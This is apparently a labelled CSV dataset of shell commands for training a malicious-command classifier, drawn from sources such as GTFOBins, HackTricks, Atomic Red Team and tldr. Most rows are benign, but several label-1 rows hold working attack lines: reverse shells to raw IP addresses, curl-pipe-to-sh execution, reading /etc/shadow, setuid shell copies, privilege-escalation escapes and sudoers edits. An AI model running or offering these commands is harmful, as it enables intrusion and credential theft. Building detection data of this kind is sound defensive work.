id,command,label,source,split
d1_002752,find . 2>/dev/null >files_and_folders,0,nl2bash,train
d1_002753,tre [-E|--exclude] regex,0,tldr,train
d1_002754,echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file,1,gtfobins,train
d1_002755,"IFS=';' read -a myArray <<< ""$myArray""",0,nl2bash,train
d1_002757,mkdir -p /dev/shm/root/examples,1,hacktricks,train
d1_002759,pypy -m module arguments,0,tldr,train
d1_002760,"if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT""; fi",1,atomic_red_team,train
d1_002761,docker run --rm ubuntu:24.04 cat /proc/self/attr/current,1,hacktricks,train
d1_002762,pgrep -a containerd,0,bash_instruct,train
d1_002765,yek path/to/directory --tokens 128k,0,tldr,train
d1_002766,[ -f export.pdf ] && cat export.pdf || echo 'not found',0,bash_instruct,train
d1_002767,cp -p session.css scripts/,0,bash_instruct,train
d1_002769,mv output.css output.css.old,0,bash_instruct,train
d1_002770,ssh -f mysql_access_server -L 3309:sqlmaster.example.com:3306 -N,0,nl2bash,train
d1_002771,mount | grep barrier,0,linlm,train
d1_002773,"OUTPUT=$(curl -s ""$STAGE_URL"" | sh 2>&1)",1,atomic_red_team,train
d1_002775,hyprctl reload,0,tldr,train
d1_002776,ssh -p 2379 operator@api.service.io,0,bash_instruct,train
d1_002779,sudo ip [tunt|tuntap] [a|add] [d|dev] tun0 [m|mode] [t|tun],0,tldr,train
d1_002781,xxd -l 64 audit.tmp,0,bash_instruct,train
d1_002782,nc -U /tmp/socket,1,hacktricks,train
d1_002785,scp -r src/ user@remote:/home/user/,0,bash6k,train
d1_002786,local c=s:accept();,1,gtfobins,train
d1_002787,find / -perm -o x -type d 2>/dev/null,1,slp,train
d1_002788,cradle install -h hostname -u username -p password,0,tldr,train
d1_002789,steamcmd +runscript script.txt,0,tldr,train
d1_002790,umount -a,0,tldr,train
d1_002791,ls -la /srv/www,0,bash_instruct,train
d1_002792,ascii-image-converter [-c|--complex] path/to/image|url,0,tldr,train
d1_002794,ls -lS modules,0,bash_instruct,train
d1_002795,apache2ctl -c 'Include /path/to/input-file',1,gtfobins,train
d1_002796,finger x@attacker.com,1,gtfobins,train
d1_002797,j4status,0,linlm,train
d1_002798,apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,1,gtfobins,train
d1_002799,$which_python T1059.006.pyc,1,atomic_red_team,train
d1_002800,head -n 1 auth.py,0,bash_instruct,train
d1_002801,head -n 20 account.png,0,bash_instruct,train
d1_002802,stat -c '%s' profile.sql,0,bash_instruct,train
d1_002804,du -sh data,0,bash_instruct,train
d1_002805,gtester -q /path/to/temp-file,1,gtfobins,train
d1_002806,sui client faucet subcommand,0,tldr,train
d1_002807,find /dir -type f -print0 | xargs -0i cat {} | grep whatever,0,nl2bash,train
d1_002808,calc -p '4/3 * pi() * 5^3',0,tldr,train
d1_002810,sudo arping host_ip,0,tldr,train
d1_002811,"openstack port create --network network_id --fixed-ip subnet=subnet_id,ip-address=27.81.130.135 port_name",0,tldr,train
d1_002812,rsync -avn releases/ lib/,0,bash_instruct,train
d1_002813,cp release.bak cache/,0,bash_instruct,train
d1_002814,du [-ah|--all --human-readable] [-t|--threshold] 1G|1024M|1048576K .[^.]* *,0,tldr,train
d1_002815,mkdir project && cd project,0,bash6k,train
d1_002816,jira issue view issue_id,0,tldr,train
d1_002817,mv export.html static/,0,bash_instruct,train
d1_002820,poweroff -r 3,1,atomic_red_team,train
d1_002821,find /home/pankaj -maxdepth 1 -cmin -5 -type f,0,nl2bash,train
d1_002823,stat -c '%s' config.csv,0,bash_instruct,train
d1_002824,cbatticon,0,tldr,train
d1_002825,find /srv/data -type f -size 500M,0,bash_instruct,train
d1_002827,"echo """" >> /etc/systemd/system/systemd-network-helper.service",1,atomic_red_team,train
d1_002828,docker run --rm debian:stable-slim mount | head,1,hacktricks,train
d1_002829,sh /tmp/art.sh,1,atomic_red_team,train
d1_002830,hyprshot [-m|--mode] output,0,tldr,train
d1_002832,duckdb -ui,0,tldr,train
d1_002833,sed -i '1d' event.txt,0,bash_instruct,train
d1_002834,sudo mknod [-Z|--context] path/to/device_file type major_device_number minor_device_number,0,tldr,train
d1_002835,chmod +x audit.tar.gz,0,bash_instruct,train
d1_002836,prettier --check src/,0,linlm,train
d1_002837,blkid 2>/dev/null,1,hacktricks,train
d1_002838,uv build,0,tldr,train
d1_002839,sudo cat /etc/shadow > /tmp/T1003.008.txt,1,atomic_red_team,train
d1_002840,shc -f script -o binary,0,tldr,train
d1_002842,file users.zip,0,bash_instruct,train
d1_002844,ri,0,tldr,train
d1_002845,cp -p build.yaml scripts/,0,bash_instruct,train
d1_002846,readlink /proc/self/ns/net,1,hacktricks,train
d1_002847,find . -perm -o+w,0,nl2bash,train
d1_002849,x ping [-b|--bar] host,0,tldr,train
d1_002850,"find ./ -type f -exec bash -c 'echo ""mv \""$1\"" \""$(echo ""$1"" | sed -re '\''s/^([^-]*)-\s*([^\.]*)/\L\1\E-\2/'\'' -e '\''s/ /_/g'\'' -e '\''s/_-/-/g'\'')\""""' - {} \;",0,nl2bash,train
d1_002851,sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3,1,atomic_red_team,train
d1_002852,[ -f backup.zip ] && cat backup.zip || echo 'not found',0,bash_instruct,train
d1_002853,sudo bclm persist,0,tldr,train
d1_002854,pulumi about,0,tldr,train
d1_002855,xxd -l 64 catalog.tmp,0,bash_instruct,train
d1_002856,cwebp path/to/image_file -o path/to/output.webp,0,tldr,train
d1_002857,[ -f event.conf ] && cat event.conf || echo 'not found',0,bash_instruct,train
d1_002858,find -name \*.plist,0,nl2bash,train
d1_002860,herd list --format txt|xml|json|md,0,tldr,train
d1_002861,umount mountpoint,0,tldr,train
d1_002863,zig translate-c -lc path/to/file.c,0,tldr,train
d1_002864,find . -mmin -60 | xargs -r ls -ld,0,nl2bash,train
d1_002865,find . -type f -iname *.pdf >> /tmp/T1083.txt,1,atomic_red_team,train
d1_002866,file order.old,0,bash_instruct,train
d1_002867,tar -xzvf backup.tar.gz -C /tmp,0,bash6k,train
d1_002868,chmod +x index.zip,0,bash_instruct,train
d1_002869,cat summary.tsv | sort | uniq,0,bash_instruct,train
d1_002870,sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3,1,atomic_red_team,train
d1_002871,ls -lt /var/log | head -n 11,0,bash6k,train
d1_002872,find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50,1,hacktricks,train
d1_002873,cp backup.yaml cache/,0,bash_instruct,train
d1_002874,head -n 20 gateway.log,0,bash_instruct,train
d1_002875,cat /proc/cpuinfo | awk '/^processor/{print $3}' | tail -1,0,nl2bash,train
d1_002876,$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0,1,hacktricks,train
d1_002877,/bin/sh -i >& /dev/tcp/98.141.38.159/443 0>&1,1,quasarnix,train
d1_002879,truss -p pid,0,tldr,train
d1_002880,du -h templates/* 2>/dev/null | sort -rh | head -n 5,0,bash_instruct,train
d1_002881,jq '.linux.maskedPaths' config.json 2>/dev/null,1,hacktricks,train
d1_002882,sudo systemctl restart rabbitmq,0,bash_instruct,train
d1_002883,iw event -r,0,tldr,train
d1_002884,VBoxManage --help,0,tldr,train
d1_002885,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' manifest.yaml | sort -u,0,bash_instruct,train
d1_002886,sudo grub-install --efi-directory path/to/efi_directory,0,tldr,train
d1_002888,sudo iptables [-A|--append] chain [-s|--source] ip_address [-j|--jump] rule,0,tldr,train
d1_002889,infection [-s|--show-mutations],0,tldr,train
d1_002890,"stty raw -echo; stty size && rcat l -ie ""/usr/bin/script -qc /bin/bash /dev/null"" 6969 && reset",1,payloads,train
d1_002891,ascii-xfr -ns /path/to/input-file,1,gtfobins,train
d1_002892,attr -g attribute_name path/to/file,0,tldr,train
d1_002893,ssh john@28.200.73.221 -p 2222,1,hacktricks,train
d1_002894,rustup set profile minimal|default,0,tldr,train
d1_002895,cp inventory.json lib/,0,bash_instruct,train
d1_002896,ansible-vault rekey --vault-password-file path/to/old_password_file --new-vault-password-file path/to/new_password_file path/to/vault_file,0,tldr,train
d1_002897,az account show [-o|--output] json|tsv|table|yaml,0,tldr,train
d1_002899,fj repo clone owner/repository,0,tldr,train
d1_002900,du -h /etc/apache2/* | sort -rh | head -n 10,0,bash_instruct,train
d1_002901,ssh ubuntu@localhost,1,atomic_red_team,train
d1_002902,pandoc document.md -o document.pdf,0,linlm,train
d1_002903,clang-check path/to/file.cpp -ast-dump --,0,tldr,train
d1_002904,docker [stop|container stop] [-s|--signal] signal container,0,tldr,train
d1_002905,chmod +x auth.yaml,0,bash_instruct,train
d1_002907,rpm --eval '%{lua:...}',1,gtfobins,train
d1_002908,sudo /usr/bin/vim /etc/hosts,1,hacktricks,train
d1_002909,sudo chown www-data migration.json,0,bash_instruct,train
d1_002910,cobc -xFj --frelax-syntax-checks /path/to/temp-file,1,gtfobins,train
d1_002911,"awk '{printf ""%d:%02d\n"", $1/3600, ($1%3600)/60}' /proc/uptime",0,bash_instruct,train
d1_002912,"echo "" $(date) $PAM_USER, $(cat -), From: $PAM_RHOST"" >> /var/log/toomanysecrets.log",1,hacktricks,train
d1_002913,find /var/cache -name '*.html' -print0 | xargs -0 grep -l TODO,0,bash_instruct,train
d1_002914,xar -cf archive.xar path/to/directory,0,tldr,train
d1_002915,"nmap -sV 85.67.42.74 -oX scan.xml && xsltproc scan.xml -o ""`date +%m%d%y`_report.html""",1,payloads,train
d1_002916,xxd -l 64 auth.md,0,bash_instruct,train
d1_002917,ydotool click 0xC1,0,tldr,train
d1_002919,dokku plugin:install full_repo_url,0,tldr,train
d1_002920,pgrep -a sshd,0,bash_instruct,train
d1_002921,sed -i '1d' metrics.tsv,0,bash_instruct,train
d1_002922,cat metrics.conf | tr 'a-z' 'A-Z',0,bash_instruct,train
d1_002923,tldr distrobox-upgrade,0,tldr,train
d1_002924,wc -l summary.bak,0,bash_instruct,train
d1_002927,cat numbers.txt,0,nl2bash,train
d1_002928,loginctl lock-session,0,bash6k,train
d1_002929,"sed 's/\t/,/g' config.ini > config.ini.csv",0,bash_instruct,train
d1_002930,kdesrc-build component_name,0,tldr,train
d1_002931,sudo systemctl reload nginx,0,bash_instruct,train
d1_002932,export XDG_CONFIG_HOME=/dev/shm/fakehome/.config,1,hacktricks,train
d1_002933,playerctl [-l|--list-all],0,tldr,train
d1_002934,ssh postgres@monitor.local,0,bash_instruct,train
d1_002935,registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -,1,hacktricks,train
d1_002936,"find ~ ! -user $USER -exec sudo chown ${USER}:""{}"" \;",0,nl2bash,train
d1_002937,find . -name something -print | head -n 5,0,nl2bash,train
d1_002938,head -n 20 payment.html,0,bash_instruct,train
d1_002940,telinit 2|3|4|5,0,tldr,train
d1_002941,"journalctl -u ssh.service -f | grep ""Failed password""",1,hacktricks,train
d1_002942,git fsck --root,0,tldr,train
d1_002943,which newrole runcon,1,hacktricks,train
d1_002944,latexdiff --type=BOLD old.tex new.tex > diff.tex,0,tldr,train
d1_002945,cat dump.csv | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_002946,sed '/^$/d' manifest.csv,0,bash_instruct,train
d1_002947,"if [ -f ""$USER_PACKAGES/usercustomize.py"" ]; then echo ""Success: usercustomize.py created under $USER_PACKAGES\n"" $(ls -la ""$USER_PACKAGES"" | grep usercustomize*); else echo ""Failed: usercustomize.py not found under $USER_PACKAGES""; fi",1,atomic_red_team,train
d1_002948,head -n 20 profile.json,0,bash_instruct,train
d1_002950,sudo systemctl start packetbeat,0,linlm,train
d1_002951,mkfifo myfifo && cat myfifo &,0,bash6k,train
d1_002952,find ./ -user root,0,nl2bash,train
d1_002953,echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded,1,atomic_red_team,train
d1_002954,"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;",1,atomic_red_team,train
d1_002955,chmod +x request.yaml,0,bash_instruct,train
d1_002956,"find . -type f | grep -vP ""\.dll$|\.exe$""",0,nl2bash,train
d1_002957,echo something | read param,0,nl2bash,train
d1_002958,ping -c 4 db01.service.io,0,bash_instruct,train
d1_002959,RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target',1,hacktricks,train
d1_002960,gcrane ls gcr.io/my-project-id,0,tldr,train
d1_002961,gzip -d ${set1[@]} &,0,nl2bash,train
d1_002962,ipsumdump --src --dst path/to/file.pcap,0,tldr,train
d1_002963,slocate -q,0,tldr,train
d1_002965,kill -HUP $( cat /var/run/nginx.pid ),0,nl2bash,train
d1_002967,chmod +x payload.py,0,bash_instruct,train
d1_002969,wc -l product.xml,0,bash_instruct,train
d1_002973,cat /etc/logstash/pipelines.yml 2>/dev/null,1,hacktricks,train
d1_002974,17 * * * * root cd / && run-parts --report /etc/cron.hourly,1,hacktricks,train
d1_002975,sort config.txt | uniq -c | sort -nr,0,bash_instruct,train
d1_002976,sudo dnf install -y curl,0,bash_instruct,train
d1_002977,tar -czf logs.tar.gz logs,0,bash_instruct,train
d1_002978,"flux create secret git secret_name --url https://hc2208abd.example.net/repository --username ""username"" --password ""password""",0,tldr,train
d1_002979,carbon-cache.py start,0,linlm,train
d1_002980,moro bye 17:30,0,tldr,train
d1_002982,timetrap edit --end time,0,tldr,train
d1_002983,stat -c '%a' backup.css,0,bash_instruct,train
d1_002984,"echo ""Description=Atomic Red Team Systemd Service"" >> /etc/systemd/system/art-systemd-service.service",1,atomic_red_team,train
d1_002985,linux-vdso.so.1 (0x00007ffef06e9000),1,hacktricks,train
d1_002986,"cat file.json | python -c ""import sys, json, jsonpath; print '\n'.join(jsonpath.jsonpath(json.load(sys.stdin), 'store.book[?(@.price < 10)].title'))""",0,nl2bash,train
d1_002987,atftpd --no-fork --verbose --daemon --no-fork --user root.root .,1,gtfobins,train
d1_002988,sudo pacman -S csh,0,linlm,train
d1_002989,systemctl mask sshd,0,linlm,train
d1_002990,cp -u profile.jpg modules/,0,bash_instruct,train
d1_002991,cat metrics.conf | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_002993,du -sh path/to/directory,0,tldr,train
d1_002994,zic -v path/to/file.infile,0,tldr,train
d1_002996,podman pull image,0,tldr,train
d1_002997,openvpn --config /path/to/input-file,1,gtfobins,train
d1_003001,az image update [-n|--name] name [-g|--resource-group] resource_group --set property=value,0,tldr,train
d1_003002,cat credentials.yaml,0,bash_instruct,train
d1_003004,mv event.css logs/,0,bash_instruct,train
d1_003005,mkinitfs,0,tldr,train
d1_003006,tar -xzf backup.tar.gz -C src,0,bash_instruct,train
d1_003007,"socat TCP-LISTEN:18080,fork,reuseaddr TCP:76.132.177.92:8080",1,hacktricks,train
d1_003008,"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",1,atomic_red_team,train
d1_003009,cat inventory.log | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_003010,brew [ls|list],0,tldr,train
d1_003012,smbget smb://server/share/file [-U|--user] username%password,0,tldr,train
d1_003014,"ssh-keygen -t rsa -C ""$APP"" -N ""$SSHKEYPASS"" -f ~/.ssh/id_rsa",0,nl2bash,train
d1_003015,sendmail < message.txt -f sender@example.com receiver@example.com,0,tldr,train
d1_003016,[ -f session.json ] && cat session.json || echo 'not found',0,bash_instruct,train
d1_003017,iptables -A OUTPUT -p icmp -j DROP,1,hacktricks,train
d1_003018,eol [-h|--help],0,tldr,train
d1_003019,du -sh static,0,bash_instruct,train
d1_003020,type -a psql,0,bash_instruct,train
d1_003022,"eix --description ""description""",0,tldr,train
d1_003023,black .,0,linlm,train
d1_003024,gzip --help | less,0,nl2bash,train
d1_003026,sudo apt install -y bat,0,bash_instruct,train
d1_003027,sudo pacman -Rns firefox,0,linlm,train
d1_003028,"sudo awk 'BEGIN {system(""/bin/sh"")}'",1,hacktricks,train
d1_003029,cp account.sql account.sql.bak,0,bash_instruct,train
d1_003031,!/bin/sh -p,1,gtfobins,train
d1_003032,sudo chown -R jenkins:operators bin,0,bash_instruct,train
d1_003033,kubectl describe [po|pods] pod_name [-n|--namespace] namespace,0,tldr,train
d1_003034,bird -u username -g group,0,tldr,train
d1_003035,go build main.go,1,hacktricks,train
d1_003036,"babel path/to/input_file --presets preset1,preset2,...",0,tldr,train
d1_003037,"echo ""${line}"" | egrep --invert-match '^($|\s*#|\s*[[:alnum:]_]+=)'",0,nl2bash,train
d1_003039,cat error.tsv | sort -u,0,bash_instruct,train
d1_003041,zabbix_agentd,0,linlm,train
d1_003042,"for f in pictures/*\ *; do mv ""$f"" ""${f// /_}""; done",0,bash6k,train
d1_003043,partclone.ext4|btrfs|fat32|xfs|... [-h|--help],0,tldr,train
d1_003044,find /data1/realtime -mmin -60 -type d,0,nl2bash,train
d1_003045,syft image:tag [-o|--output] format=path/to/output_file,0,tldr,train
d1_003047,"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules",1,atomic_red_team,train
d1_003049,pkgutil --check-signature path/to/file.pkg,0,tldr,train
d1_003050,iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT,1,hacktricks,train
d1_003051,echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r,1,atomic_red_team,train
d1_003052,tldr pnmquant,0,tldr,train
d1_003053,mv -n inventory.json inventory.json.old,0,bash_instruct,train
d1_003054,"Remove-NodeVersion node_version1 , node_version2 , ...",0,tldr,train
d1_003056,ng [n|new] app_name --interactive false,0,tldr,train
d1_003058,scp sales.png jenkins@cache.example.com:/tmp/,0,bash_instruct,train
d1_003059,pnpm outdated [-g|--global],0,tldr,train
d1_003060,bd list,0,tldr,train
d1_003061,"echo ""echo Hello from Atomic Red Team"" | at now + 1 minute",1,atomic_red_team,train
d1_003062,gcc path/to/source.c -Wall [-g|--debug] -Og [-o|--output] path/to/output_executable,0,tldr,train
d1_003063,find /home -user root 2>/dev/null,1,hacktricks,train
d1_003065,"find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name ""*backup*"" -o -name ""*\.bak"" -o -name ""*\.bck"" -o -name ""*\.bk"" \) 2>/dev/null",1,hacktricks,train
d1_003066,socat - UNIX-CLIENT:/dev/socket,1,hacktricks,train
d1_003067,cat session.yaml | tail -n 15,0,bash_instruct,train
d1_003070,sort results.tsv | uniq -c | sort -nr,0,bash_instruct,train
d1_003071,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' results.csv | sort -u,0,bash_instruct,train
d1_003072,SafeEjectGPU Eject,0,tldr,train
d1_003073,"cat product.yaml | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,train
d1_003074,node script.js,0,linlm,train
d1_003075,touch -r /bin/ls /lib/security/pam_unix.so,1,hacktricks,train
d1_003076,sed -i '1d' order.conf,0,bash_instruct,train
d1_003077,mv -n summary.bak summary.bak.old,0,bash_instruct,train
d1_003078,tail -n +200 worker.log,0,bash_instruct,train
d1_003079,sed -i '1d' session.json,0,bash_instruct,train
d1_003080,int main(void) {,1,hacktricks,train
d1_003081,xmodmap -v /path/to/input-file,1,gtfobins,train
d1_003082,sudo insmod demo.ko,1,hacktricks,train
d1_003083,strings /path/to/input-file,1,gtfobins,train
d1_003084,sfdk build-requires diff,0,tldr,train
d1_003086,sshfs user@attacker.com:/ /path/to/dir/,1,gtfobins,train
d1_003087,/bin/dash -i >& /dev/tcp/7.191.119.37/80 0>&1,1,quasarnix,train
d1_003088,/usr/bin/find $*,0,nl2bash,train
d1_003089,grep 'unauthorized' worker.log | tail -n 10,0,bash_instruct,train
d1_003090,echo $(yes % | head -n3),0,nl2bash,train
d1_003091,"find -depth -type d | while read dir; do [[ ! $prev =~ $dir ]] && echo ""${dir}"" ; prev=""$dir""; done",0,nl2bash,train
d1_003092,"env | awk -F= '/[a-zA-Z_][a-zA-Z_0-9]*=/ { if (!system(""[ -n \""${"" $1 ""+y}\"" ]"")) print $1 }' | sort | uniq",0,nl2bash,train
d1_003093,bun publish --dry-run,0,tldr,train
d1_003094,grep -R . /etc/selinux/*/contexts/customizable_types 2>/dev/null | head,1,hacktricks,train
d1_003095,sudo chgrp developers archive.tar.gz,0,bash_instruct,train
d1_003096,grep 'denied' ingest.log,0,bash_instruct,train
d1_003097,cat /sys/fs/cgroup/blkio/blkio.throttle.read_bps_device,0,linlm,train
d1_003098,curl -s http://h1848ed4c.example.net/server_info 2>/dev/null | head,1,hacktricks,train
d1_003100,pkill -9 elasticsearch,0,bash_instruct,train
d1_003101,sudo rc-update add service_name runlevel,0,tldr,train
d1_003102,stat backup.log,0,bash_instruct,train
d1_003103,az devops login [--org|--organization] organization_url,0,tldr,train
d1_003104,chroot /tmp/host /bin/bash 2>/dev/null,1,hacktricks,train
d1_003105,find /lib/modules -name '*.o',0,nl2bash,train
d1_003106,img2sixel path/to/image,0,tldr,train
d1_003108,"grep -RIl """" .",0,nl2bash,train
d1_003109,pip install package-name,0,linlm,train
d1_003110,history 10 | cut -c 8-,0,nl2bash,train
d1_003111,sudo chown alice results.tar.gz,0,bash_instruct,train
d1_003113,gunzip < some.file.gz,0,nl2bash,train
d1_003114,tod task list --project work,0,tldr,train
d1_003115,cat access.json | tr 'a-z' 'A-Z',0,bash_instruct,train
d1_003117,"find .|grep ""FooBar""|yargs -l 203 cp --after ~/foo/bar",0,nl2bash,train
d1_003118,ls -alhR /srv/www/htdocs/ 2>/dev/null,1,hacktricks,train
d1_003119,cat -A /etc/cron.d/*,1,hacktricks,train
d1_003120,"sshare [-u|--users] user_id_1,user_id_2,...",0,tldr,train
d1_003123,/usr/bin/dash -i 3<> /dev/udp/12.175.233.79/53 0<&3 1>&3 2>&3,1,quasarnix,train
d1_003124,cp migration.sql uploads/,0,bash_instruct,train
d1_003126,tmate -c /bin/sh,1,gtfobins,train
d1_003127,sudo apparmor_parser [-a|--add] profile_file,0,tldr,train
d1_003130,crane rebase [-h|--help],0,tldr,train
d1_003131,find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null,1,hacktricks,train
d1_003132,dart fix --apply,0,tldr,train
d1_003133,sudo chgrp docker changelog.log,0,bash_instruct,train
d1_003134,find / -type d -name __pycache__ -writable 2>/dev/null,1,hacktricks,train
d1_003135,zip2john -o path/to/compressed_file path/to/file.zip > file.hash,0,tldr,train
d1_003136,mv transaction.tmp lib/,0,bash_instruct,train
d1_003137,find . -name '*.log' -mtime +3 -print0 | xargs -0 -n 500 -P 4 bzip2,0,nl2bash,train
d1_003138,find-repos-of-install | grep rpmfusion | xargs yum update,0,nl2bash,train
d1_003139,gh issue [new|create] [-F|--body-file] path/to/file,0,tldr,train
d1_003140,rmdir releases,0,bash_instruct,train
d1_003142,"echo ""block in proto tcp from 10.195.88.8 to any"" | pfctl -a pf-rules -f -",1,atomic_red_team,train
d1_003143,"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /etc/sudoers""",1,atomic_red_team,train
d1_003147,mv users.tar.gz data/,0,bash_instruct,train
d1_003148,objdump -T /bin/su | grep audit,1,hacktricks,train
d1_003149,export API_KEY=secret123,0,linlm,train
d1_003150,systemctl status redis,0,bash_instruct,train
d1_003151,cat ${TMP}/${SCRIPT_NAME}.name|sort -r;,0,nl2bash,train
d1_003152,nix develop nixpkgs#pkg,0,tldr,train
d1_003153,if $(printenv SHELL >/dev/null); then printenv SHELL; fi,1,atomic_red_team,train
d1_003154,rpmquery --eval '%(/bin/sh 1>&2)',1,gtfobins,train
d1_003155,mv *.cache scripts/,0,bash_instruct,train
d1_003156,links /path/to/input-file,1,gtfobins,train
d1_003158,wc -l event.log,0,bash_instruct,train
d1_003161,pg_createsubscriber [-n|--dry-run] [-d|--database] dbname [-D|--pgdata] path/to/data [-P|--publisher-server] connstr,0,tldr,train
d1_003162,check_log -F /path/to/input-file -O /path/to/output-file,1,gtfobins,train
d1_003163,history | grep 'command',0,bash6k,train
d1_003164,openstack subnet set --dns-nameserver 84.166.54.191 --name new_subnet_name subnet_id,0,tldr,train
d1_003165,cp invoice.py docs/,0,bash_instruct,train
d1_003167,tmt test create [-t|--template] beakerlib --link verifies:issue#1234,0,tldr,train
d1_003169,GROFF_BIN_PATH=. nroff,1,gtfobins,train
d1_003170,git apply --unsafe-paths --directory / x.patch,1,gtfobins,train
d1_003171,cat inventory.txt | tr 'a-z' 'A-Z',0,bash_instruct,train
d1_003172,git merge-index git-merge-one-file -- path/to/file,0,tldr,train
d1_003175,nc -cu /bin/sh 150.155.132.118 9001,1,quasarnix,train
d1_003176,alpine,0,linlm,train
d1_003178,chmod +x request.jpg,0,bash_instruct,train
d1_003179,sudo asr restore --source image_file.dmg --target path/to/volume_file --noverify,0,tldr,train
d1_003181,xxd -l 64 build.pdf,0,bash_instruct,train
d1_003182,ghcup install cabal,0,tldr,train
d1_003183,file catalog.pdf,0,bash_instruct,train
d1_003184,netstat -an | grep ESTABLISHED | awk '{print $4}' | sort | uniq -c | sort -rn | head -5,0,bash6k,train
d1_003185,lsappinfo info com.apple.calculator,0,tldr,train
d1_003186,"speak-ng -s speed -p pitch ""text""",0,tldr,train
d1_003187,xxd -l 64 error.py,0,bash_instruct,train
d1_003188,sed -i 's/POST/76.132.177.92/g' report.json,0,bash_instruct,train
d1_003190,catimg -w|-H 40 path/to/file,0,tldr,train
d1_003191,ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=quiet -i identity_file machine.example.org gcc -dumpversion,0,nl2bash,train
d1_003192,pw usermod nobody -s /bin/sh,1,atomic_red_team,train
d1_003193,pass version,0,linlm,train
d1_003194,sudo chgrp mysql data.yaml,0,bash_instruct,train
d1_003195,pnmtorle path/to/input.pnm > path/to/output.rle,0,tldr,train
d1_003196,chroot /mnt /bin/bash,1,gtfobins,train
d1_003197,ern run-ios|android,0,tldr,train
d1_003198,sudo chgrp www-data build.md,0,bash_instruct,train
d1_003199,join file1 file2 | column -t,0,nl2bash,train
d1_003200,"cut -d, -f1 metrics.csv | sort | uniq -c | sort -nr | head -n 10",0,bash_instruct,train
d1_003203,ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest,1,hacktricks,train
d1_003204,cargo install --list,0,tldr,train
d1_003205,victoria-metrics-prod -reload,0,linlm,train
d1_003206,nxc wmi 67.197.130.184 [-u|--username] username [-p|--password] password -x command,0,tldr,train
d1_003207,tail -n 20 index.jpg,0,bash_instruct,train
d1_003208,md-to-clip --output-directory path/to/directory path/to/page1.md path/to/page2.md ...,0,tldr,train
d1_003209,ipconfig getiflist,0,tldr,train
d1_003210,nmap --interactive,1,gtfobins,train
d1_003211,sudo chown svc-app test.zip,0,bash_instruct,train
d1_003213,head -n -1000 server.log,0,bash_instruct,train
d1_003214,"MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)",1,atomic_red_team,train
d1_003215,"ps -C mongod -o pid=,rss= --sort=-rss",0,bash_instruct,train
d1_003216,"find whatever ... | xargs -d ""\n"" cp -t /var/tmp",0,nl2bash,train
d1_003217,grep -oE '(INFO|WARN|ERROR|DEBUG)' output.log | sort | uniq -c | sort -nr,0,bash_instruct,train
